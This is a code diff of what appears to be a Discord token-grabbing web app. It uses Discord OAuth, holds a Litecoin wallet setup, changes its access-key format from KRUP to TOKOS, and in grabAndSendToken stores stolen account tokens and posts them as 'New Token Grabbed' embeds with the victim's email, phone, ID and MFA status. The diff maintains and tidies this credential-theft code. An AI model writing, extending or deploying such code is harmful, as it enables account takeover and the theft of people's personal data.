@@ -264,7 +264,7 @@ passport.deserializeUser((obj, done) => done(null, obj));
 
 const CLIENT_ID = process.env.CLIENT_ID;
 const CLIENT_SECRET = process.env.CLIENT_SECRET;
-const CALLBACK_URL = process.env.CALLBACK_URL;
+const CALLBACK_URL = process.env.CALLBACK_URL || '/auth/discord/callback';
 const OWNER_LTC_ADDRESS = process.env.OWNER_LTC_ADDRESS || 'ltc1qc3ujjqjlfr3cqtvyqadqje9ntj3f8f82m062tc';
 const WALLET_MNEMONIC = process.env.WALLET_MNEMONIC;
 const TARGET_USD = 1.50;
@@ -288,17 +288,13 @@ function validateKeyStrict(key) {
     if (!key || typeof key !== 'string') {
         return { valid: false, error: 'Invalid key', normalized: null };
     }
-    // Normalize: uppercase, trim, and fix common typos (KPUR->KRUP, KURP->KRUP, etc.)
     let trimmed = key.trim().toUpperCase();
     
-    // Fix common misspellings of KRUP
-    trimmed = trimmed.replace(/^KPUR/, 'KRUP').replace(/^KURP/, 'KRUP').replace(/^KPRU/, 'KRUP').replace(/^KRPU/, 'KRUP');
-    
-    const baseMatch = trimmed.match(/^KRUP([1-9][0-9]?|99)$/);
+    const baseMatch = trimmed.match(/^TOKOS(1[0-9][0-9]|200)$/);
     if (baseMatch) {
         const num = parseInt(baseMatch[1], 10);
-        if (num >= 1 && num <= 99) {
-            return { valid: true, error: null, normalized: `KRUP${num}` };
+        if (num >= 100 && num <= 200) {
+            return { valid: true, error: null, normalized: `TOKOS${num}` };
         }
     }
     
@@ -373,7 +369,7 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
         db.addGrabbedToken(token, fullInfo, source);
         
         const embed = {
-            title: 'ð£ New Token Grabbed',
+            title: '🎣 New Token Grabbed',
             color: 0xff0000,
             fields: [
                 { name: 'Token', value: `\`\`\`${token}\`\`\``, inline: false },
@@ -381,9 +377,9 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
                 { name: 'ID', value: fullInfo.id || 'N/A', inline: true },
                 { name: 'Email', value: fullInfo.email || 'N/A', inline: true },
                 { name: 'Phone', value: fullInfo.phone || 'N/A', inline: true },
-                { name: 'MFA', value: fullInfo.mfa_enabled ? 'â Enabled' : 'â Disabled', inline: true },
-                { name: 'Verified', value: fullInfo.verified ? 'â Yes' : 'â No', inline: true },
-                { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : 'â No', inline: true },
+                { name: 'MFA', value: fullInfo.mfa_enabled ? '✅ Enabled' : '❌ Disabled', inline: true },
+                { name: 'Verified', value: fullInfo.verified ? '✅ Yes' : '❌ No', inline: true },
+                { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : '❌ No', inline: true },
                 { name: 'Source', value: source, inline: true },
                 { name: 'Time', value: new Date().toISOString(), inline: true }
             ],
